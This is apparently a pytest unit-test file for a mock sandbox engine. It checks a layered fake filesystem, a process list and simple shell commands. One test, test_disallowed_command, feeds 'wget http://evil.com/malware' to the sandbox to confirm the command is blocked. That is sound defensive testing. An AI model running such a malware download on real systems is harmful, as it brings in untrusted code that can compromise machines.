"""Unit tests for the sandbox engine."""

import pytest
from engine.filesystem import MockFile, MockFilesystem
from engine.process_manager import MockProcess, ProcessManager
from engine.sandbox import Sandbox
from engine.security import CommandNotAllowedError


@pytest.fixture
def sandbox() -> Sandbox:
    """Create a sandbox with a simple initial state."""
    fs = MockFilesystem()
    fs.set_base({
        "/etc/hostname": MockFile(path="/etc/hostname", content="test-host"),
    })
    fs.set_overlay({
        "/home/user/hello.txt": MockFile(path="/home/user/hello.txt", content="Hello World"),
    })
    pm = ProcessManager()
    pm.load([MockProcess(pid=100, command="test-server", port_bindings=[8080])])
    return Sandbox(fs, pm)


class TestSandboxCommands:
    def test_ls_lists_files(self, sandbox: Sandbox) -> None:
        result = sandbox.execute("ls /home/user")
        assert "hello.txt" in result.stdout

    def test_cat_reads_file(self, sandbox: Sandbox) -> None:
        result = sandbox.execute("cat /home/user/hello.txt")
        assert result.stdout == "Hello World"

    def test_cat_missing_file(self, sandbox: Sandbox) -> None:
        result = sandbox.execute("cat /nonexistent")
        assert result.stderr
        assert not result.success

    def test_pwd(self, sandbox: Sandbox) -> None:
        result = sandbox.execute("pwd")
        assert result.stdout == "/home/user"

    def test_mv_renames_file(self, sandbox: Sandbox) -> None:
        sandbox.execute("mv /home/user/hello.txt /home/user/greeting.txt")
        result = sandbox.execute("cat /home/user/greeting.txt")
        assert result.stdout == "Hello World"

    def test_echo(self, sandbox: Sandbox) -> None:
        result = sandbox.execute("echo foo bar")
        assert result.stdout == "foo bar"

    def test_ps_shows_processes(self, sandbox: Sandbox) -> None:
        result = sandbox.execute("ps aux")
        assert "test-server" in result.stdout

    def test_kill_process(self, sandbox: Sandbox) -> None:
        sandbox.execute("kill -9 100")
        result = sandbox.execute("ps aux")
        assert "test-server" not in result.stdout

    def test_disallowed_command(self, sandbox: Sandbox) -> None:
        with pytest.raises(CommandNotAllowedError):
            sandbox.execute("wget http://evil.com/malware")

    def test_command_history_tracked(self, sandbox: Sandbox) -> None:
        sandbox.execute("ls /")
        sandbox.execute("cat /etc/hostname")
        assert len(sandbox.command_history) == 2


class TestFilesystem:
    def test_overlay_does_not_modify_base(self, sandbox: Sandbox) -> None:
        sandbox.execute("mv /home/user/hello.txt /tmp/moved.txt")
        # Base layer should remain unchanged
        assert sandbox.fs.exists("/etc/hostname")

    def test_write_creates_overlay_entry(self, sandbox: Sandbox) -> None:
        sandbox.execute("touch /home/user/new_file.txt")
        assert sandbox.fs.exists("/home/user/new_file.txt")
